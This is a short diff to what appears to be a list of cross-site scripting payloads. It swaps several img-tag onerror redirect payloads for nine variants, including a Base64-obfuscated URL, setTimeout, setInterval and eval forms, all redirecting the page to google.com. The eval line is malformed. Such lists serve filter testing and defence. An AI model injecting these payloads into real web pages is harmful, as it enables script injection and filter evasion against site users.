@@ -1,5 +1,9 @@
-<img src=x onerror=window.location.assign(document.location=&#39;https://google.com&#39;)>
-
-<img src=x onerror=window.location.assign(document.location='https://' + 'google.com')>
-<img src=x onerror=window.location.assign(document.location='https:\\google.com')>
-<img src=x onerror=window.location.assign(document.location='https:/'/google.com')>
+<img src=x onerror=window.location=`https://google.com`>
+<img src=x onerror=window.location=atob(`aHR0cHM6Ly9nb29nbGUuY29t`)> <!-- Uses Base64 decoding -->
+<img src=x onerror=location=`https://google.com`>
+<img src=x onerror=document.location=`https://google.com`>
+<img src=x onerror=window['location']=`https://google.com`>
+<img src=x onerror=location.href=`https://google.com`>
+<img src=x onerror=setTimeout(()=>(location=`https://google.com`),0)>
+<img src=x onerror=eval(`window.location=https://google.com`)>
+<img src=x onerror=setInterval(()=>{location=`https://google.com`},0)>
